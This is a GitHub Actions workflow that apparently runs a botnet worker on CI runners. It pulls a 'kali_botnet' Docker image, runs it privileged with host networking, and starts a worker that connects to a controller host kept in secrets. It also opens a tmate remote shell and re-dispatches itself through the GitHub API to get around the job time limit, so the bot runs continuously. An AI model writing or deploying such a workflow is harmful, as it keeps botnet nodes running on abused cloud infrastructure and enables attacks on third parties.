name: Run Bot with Auto-Restart and tmate

on:
  workflow_dispatch:

jobs:
  run-bot:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    env:
      GH_TOKEN: ${{ secrets.GH_TOKEN }}
      DOCKERHUB_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}
      DOCKERHUB_PASSWORD: ${{ secrets.DOCKERHUB_PASSWORD }}
      CONTROLLER_HOST: ${{ secrets.CONTROLLER_HOST }}
      CONTROLLER_PORT: ${{ secrets.CONTROLLER_PORT }}

    steps:
      - name: Checkout Repo
        uses: actions/checkout@v3

      - name: Login to Docker Hub
        run: |
          set -x
          echo "$DOCKERHUB_PASSWORD" | docker login -u "$DOCKERHUB_USERNAME" --password-stdin

      - name: Pull Bot Image
        run: |
          set -x
          IMAGE_NAME=${DOCKERHUB_USERNAME}/kali_botnet:botv1
          docker pull $IMAGE_NAME

      - name: Remove Old Bot Container
        run: |
          set -x
          docker rm -f kali_bot || true

      - name: Run Bot Container
        run: |
          set -x
          IMAGE_NAME=${DOCKERHUB_USERNAME}/kali_botnet:botv1
          docker run -d --name=kali_bot \
            --privileged \
            --network=host \
            -e CONTROLLER_HOST=$CONTROLLER_HOST \
            -e CONTROLLER_PORT=$CONTROLLER_PORT \
            $IMAGE_NAME \
            tail -f /dev/null
          sleep 5
          docker ps -a

      - name: Start Bot Services
        run: |
          set -x
          docker exec kali_bot tmux new -d -s bot "python3 /app/botnetv2/worker/worker.py --host $CONTROLLER_HOST --port $CONTROLLER_PORT"
          docker exec kali_bot tmux ls

      - name: Start detached tmate session
        run: |
          set -e
          sudo apt-get update -y
          sudo apt-get install -y tmate
          export TMATE_SOCK=/tmp/tmate.sock
          tmate -S $TMATE_SOCK new-session -d
          for i in $(seq 1 30); do
            SSH_URL=$(tmate -S $TMATE_SOCK display -p '#{tmate_ssh}')
            if [ -n "$SSH_URL" ]; then break; fi
            sleep 1
          done
          if [ -z "$SSH_URL" ]; then
            echo "tmate failed to start."
            tmate -S $TMATE_SOCK show-messages || true
            exit 1
          fi
          echo "================= TMATE CONNECTION INFO ================="
          echo "SSH  : $SSH_URL"
          echo "WEB  : $(tmate -S $TMATE_SOCK display -p '#{tmate_web}')"
          echo "========================================================="

      - name: Keep Workflow Alive & Auto-Restart
        run: |
          set -e
          start_time=$(date +%s)
          max_runtime=$((5 * 3600 + 1800)) # 5.5 hours

          trap 'echo "[Trap] SIGTERM caught. Restarting workflow..."; \
                curl -s -o /dev/null -w "[HTTP %{http_code}] Triggered workflow\n" \
                  -X POST \
                  -H "Accept: application/vnd.github+json" \
                  -H "Authorization: Bearer $GH_TOKEN" \
                  https://api.github.com/repos/${{ github.repository }}/actions/workflows/bot.yml/dispatches; \
                exit 0' TERM

          while true; do
          now=$(date +%s)
          uptime=$((now - start_time))
          echo "[$(date)] Uptime: $((uptime / 60)) minutes"
      
          if [ "$uptime" -ge "$max_runtime" ]; then
              #echo "[$(date)] Max runtime reached. Committing and pushing container..."
              #docker commit kali_controller ${DOCKERHUB_USERNAME}/kali_botnet:controllerAuto
              #docker push ${DOCKERHUB_USERNAME}/kali_botnet:controllerAuto
              sleep 1
              echo "Triggering workflow restart..."
              curl -s -o /dev/null -w "[HTTP %{http_code}] Triggered workflow\n" \
                  -X POST \
                  -H "Accept: application/vnd.github+json" \
                  -H "Authorization: Bearer $GH_TOKEN" \
                  https://api.github.com/repos/${{ github.repository }}/actions/workflows/bot.yml/dispatches \
                  -d '{"ref":"main"}'
              exit 0
          fi
      
          sleep 60
          done
